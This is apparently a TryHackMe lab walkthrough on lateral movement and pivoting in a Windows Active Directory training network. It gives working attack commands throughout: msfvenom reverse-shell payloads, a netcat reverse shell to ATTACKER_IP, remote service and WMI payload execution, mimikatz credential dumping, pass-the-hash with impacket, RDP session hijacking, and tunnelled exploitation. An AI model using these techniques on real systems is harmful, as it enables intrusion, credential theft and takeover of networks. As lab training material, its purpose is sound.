# Lateral Movement & Pivoting

## High-Level Overview

Practice common techniques used to move laterally across a Windows network.

## Tools Needed

* Metasploit
* Nc
* impacket
* mimikatz
* xfreerdp

## Walkthrough

### Connecting to the Network

* Download the Network VPN Server `Lateralmovementandpivoting` configuration file for OpenVPN
* Connect using OpenVPN and the TryHackMe VPN file
	* `sudo openvpn user-lateralmovementandpivoting.ovpn`
* Configure the DNS on the host which you are running the VPN connection:
	* Edit the `resolv.conf` file with the command `sudo nano /etc/resolv.conf` and add the line `nameserver 10.200.51.101` at the end of the file.
	* Or use `sudo resolvectl dns lateralmovement 10.200.51.101`
	* `10.200.51.101` is the IP of the `THMDC` in my case.
* Test DNS resolution with the command `nslookup thmdc.za.tryhackme.com` - this should resolve to the IP of the DC
* Your IP for can be identified using `ip add show lateralmovement` - the inet IP you will use for reverse shells, listeners, etc.

### Getting AD Credentials

After connecting with the VPN and configuring DNS, navigate to `http://distributor.za.tryhackme.com/creds` to request your credential pair by clicking the `Get Credentials` button.

This credential pair will be used to access `THMJMP2.za.tryhackme.com` via SSH using the command:

```bash
$ ssh za\\AD_USERNAME_HERE@thmjmp2.za.tryhackme.com
```

### Task 3

* Connect using the supplied credentials via SSH

```bash
ssh za\\AD_USERNAME@thmjmp2.za.tryhackme.com
```

* We are given some already captured admin credentials:
	* User: `ZA.TRYHACKME.COM\t1_leonard.summers`
	* Password: `EZpass4ever`
* We will use those credentials to move laterally to `THMIIS` using `sc.exe`
* Create a reverse shell using `msfvenom` (rename `radu-service.exe` to something else):

```bash
$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o radu-service.exe
```

* Use the credentials above to upload the payload to the `ADMIN$` share of the `THMIIS` using `smbclient`:

```bash
smbclient -c 'put radu-service.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

* After uploading it, open a terminal and set up a listener using `msfconsole`:

```bash
$ msfconsole
> use exploit/multi/handler
> set LHOST ATTACKER:IP
> set LPORT 4444
> set payload windows/shell/reverse_tcp
> exploit
```

* This `metasploit` listener won't receive a shell until we trigger the `msfvenom` payload `radu-service.exe`
* Open a new terminal window and set up a `nc` listener to prepare for receiving a reverse shell:

```bash
$ nc -lvp 4443
```

* Go back to the SSH connection and spawn a reverse shell using `t1_leonard.summers` access token:

```bash
$ runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

* Finally, in this connection received on port 4443 create a new service remotely using `sc` (rename `radu-service` to something else):
* This triggers the `radu-service.exe` payload and you will have a shell as `t1_leonard.summers`

```powershell
> sc.exe \\thmiis.za.tryhackme.com create radu-service binPath= "%windir%\radu-service.exe" start= auto
> sc.exe \\thmiis.za.tryhackme.com start radu-service
```

* After successfully running the commands above, you should have a connection as `t1_leonard.summers` in your `metasploit` listener. Use it to access the first flag on `C:\Users\t1_leonard.summers\Desktop\Flag.exe`

### Task 4

* Connect to the SSH using the supplied AD credentials:

```bash
ssh za\\AD_USERNAME@thmjmp2.za.tryhackme.com
```

* We are also given a set of administrative credentials:
	* User: `ZA.TRYHACKME.COM\t1_corine.waters`
	* Password: `Korine.1994`
* Create the MSI payload using `msfvenom` (make sure to rename `radu-installer.msi` with something else):

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f msi > radu-installer.msi
```

* Transfer the payload using SMB:

```bash
$ smbclient -c 'put radu-installer.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

* Start a `metasploit` listener/handler:

```bash
$ msfconsole
> use exploit/multi/handler
> set LHOST ATTACKER_IP
> set LPORT 4445
> set payload windows/x64/shell_reverse_tcp
> exploit
```

* Using the SSH connection, configure and start a WMI session against `THMIIS` by opening powershell and typing the commands:

```powershell
> powershell
> $username = 't1_corine.waters';
> $password = 'Korine.1994';
> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
> $Opt = New-CimSessionOption -Protocol DCOM
> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

* Finally, invoke the `Install` method to trigger the payload:

```powershell
> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\radu-installer.msi"; Options = ""; AllUsers = $false}
```

You should now have a reverse shell in your `metasploit` listener. Get the flag by running the file located at: `C:\Users\t1_corine.waters\Desktop\Flag.exe`.

### Task 5

* Log in using SSH with the newly provided Administrator credentials:

```bash
$ ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
```

* From this session, we will use mimikatz - it's already located on the machine - run the following commands:

```powershell
> powershell
> cd C:\tools
> mimikatz.exe
> privilege::debug
> token::elevate
> sekurlsa::msv
```
* From the output of `mimikatz`, grab the NTLM hash of `t1_toby.beck`
* We will perform a Pass-the-Hash attack
* On the attacking machine - use `impacket` to log in:

```bash
$ impacket-wmiexec -hashes ':533f1bd576caa912bdb9da284bbc60fe' 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com'
```

### Task 6

* Get a new set of credentials from `http://distributor.za.tryhackme.com/creds_t2`
* Connect to the machine using the command `xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD`
* Since we already have `psexec` on the machine, we can open a cmd as administrator and elevate to `NT AUTHORITY` using the command `C:\tools\psexec64.exe -accepteula -s -i cmd.exe`
* From this newly opened cmd we will run `query session` to identify RDP sessions open
* Inside the same `psexec` cmd window we can run the command `tscon 2 /dest:rdp-tcp#105` (replace `#105` with whatever is shown as available) to hijack the rdp session and we will be greeted with the flag.

### Task 7

#### Flag 1

* Log in using SSH and your credentials from `http://distributor.za.tryhackme.com/creds` by using the command:

```bash
$ ssh za\\AD_USERNAME@thmjmp2.za.tryhackme.com
```

* Once logged in use `socat` to forward the RDP port to make it available on `THMJMP2` to connect from the attacker machine (make sure to change 14000 to a different port):

```powershell
> cd C:\tools\socat
> socat TCP4-LISTEN:14000,fork TCP4:THMIIS.za.tryhackme.com:3389
```

* With the listener is set up, connect to `THMIIS` via RDP from your attacker machine by pivoting through your `socat` listener at `THMJMP2` using this command:

```bash
$ xfreerdp /v:THMJMP2.za.tryhackme.com:14000 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

* On this RDP session you can see the `flag.bat` file on the desktop. Run it to get your final flag.

#### Tunnelling Complex Exploits

* Create a user to use for SSH tunneling:

```bash
$ useradd tunneluser -m -d /home/tunneluser -s /bin/true
$ passwd tunneluser
$ sudo systemctl start ssh
```

* Connect to SSH using your credentials from `http://distributor.za.tryhackme.com/creds`:

```bash
$ ssh za\\AD_USERNAME@thmjmp2.za.tryhackme.com
```

* Inside this session, use your newly made `tunneluser` and make sure to replace the `SRVPORT=6666` and `LPORT=7878` to something else:

```bash
$ ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

* Open `metasploit` and configure the exploit so you can get a listener:

```bash
$ msfconsole
> use rejetto_hfs_exec
> set payload windows/shell_reverse_tcp
> set lhost thmjmp2.za.tryhackme.com
> set ReverseListenerBindAddress 127.0.0.1

> set lport 7878
> set srvhost 127.0.0.1
> set srvport 6666

> set rhosts 127.0.0.1
> set rport 8888
> exploit
```

* If all went well, you will receive a shell where you can find the final flag located at `c:\hfs\flag.txt`
* After getting the flag, you can disable disable SSH on your machine if you don't want it to keep running:

```bash
$ sudo systemctl stop ssh
$ sudo systemctl disable ssh
```